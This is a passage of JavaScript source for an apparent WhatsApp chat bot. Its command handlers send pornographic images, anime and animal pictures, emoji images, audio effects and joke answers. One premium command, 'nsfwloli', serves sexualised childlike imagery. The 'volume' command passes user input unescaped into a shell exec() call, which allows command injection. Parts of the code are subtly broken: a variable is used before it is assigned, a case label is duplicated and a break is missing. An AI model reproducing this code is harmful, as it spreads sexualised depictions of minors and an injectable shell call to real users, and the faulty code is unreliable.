XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await XeonBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./MikoMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await XeonBotInc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return reply(mess.only.group)
if (!AntiNsfw) return replygcxeon(mess.nsfw)
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
reply(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/YaeMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

case 'animeneko':{
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcxeon("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcxeon("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcxeon('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await XeonBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await XeonBotInc.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcxeon("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcxeon('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcxeon(body)
  } catch (e) {
  replygcxeon(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcxeon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/YaeMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
case "spotify":{
if (!isPrem) return replyprem(mess.premium)
if (!text) return replygcxeon(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcxeon(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await XeonBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await XeonBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply(mess.wait)
let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon(err)
let buff = fs.readFileSync(ran)
XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else replygcxeon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
replygcxeon(e)
}
break
case 'define': 
if (!q) return replygcxeon(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcxeon(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   XeonBotInc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcxeon(`*${q}* isn't a valid text`)
    }
    break
case 'can': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
let keh = bisa[Math.floor(Math.random() * bisa.length)]
let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcxeon(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
let kah = apa[Math.floor(Math.random() * apa.length)]
let jawab = `*Is ${text}*\nAnswer : ${kah}`
            await replygcxeon(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
let koh = kapan[Math.floor(Math.random() * kapan.length)]
let jawab = `*${command} ${text}*\nAnswer : ${koh}`
            await replygcxeon(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
let kah = lel[Math.floor(Math.random() * lel.length)]
let jawab = `*What ${text}*\nAnswer : ${kah}`
            await replygcxeon(jawab)
            }
            break
case 'where': {
if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcxeon(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcxeon(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
let kah = gimana[Math.floor(Math.random() * gimana.length)]
let jawab = `*How ${text}*\nAnswer : ${kah}`
            await replygcxeon(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcxeon(`Example : ${prefix + command} my profile`)
